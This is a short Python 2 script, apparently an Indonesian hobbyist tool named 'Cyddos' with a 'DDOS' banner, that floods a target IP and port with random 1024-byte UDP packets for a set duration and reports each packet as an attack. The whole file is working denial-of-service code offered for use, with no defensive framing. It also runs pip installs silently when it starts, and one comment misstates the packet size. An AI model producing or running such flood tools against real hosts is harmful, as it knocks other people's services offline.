"""Cyddos Author by Cyto"""
import time
import socket
import random
import sys
import os

os.system('pip install termcolor && pip install colored && pip install requests && clear')
import termcolor
from termcolor import colored

def usage():
    print(colored("************************",'blue'))
    print(colored("*         KUBUCY          *",'blue'))
    print(colored("*          DDOS        *",'blue'))
    print(colored("*                      *",'blue'))
    print(colored("************************",'blue'))

    print(colored("********** <Cyto> *********\n", 'green'))
    print "Ketik: python2 " + sys.argv[0] + " -ip- -port- -packet-"


def flood(victim, vport, duration):
    # okay so here I create the server, when i say "SOCK_DGRAM" it means it's a UDP type program
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    # 1024 representes one byte to the server
    bytes = random._urandom(1024)
    timeout =  time.time() + duration
    sent = 0

    while 1:
        if time.time() > timeout:
            break
        else:
            pass
        client.sendto(bytes, (victim, vport))
        sent = sent + 1
        print "Menyerang dengan %s Paket pada IP %s No.Port %s "%(sent, victim, vport)

def main():
    print len(sys.argv)
    if len(sys.argv) != 4:
        usage()
    else:
        flood(sys.argv[1], int(sys.argv[2]), int(sys.argv[3]))

if __name__ == '__main__':
    main()
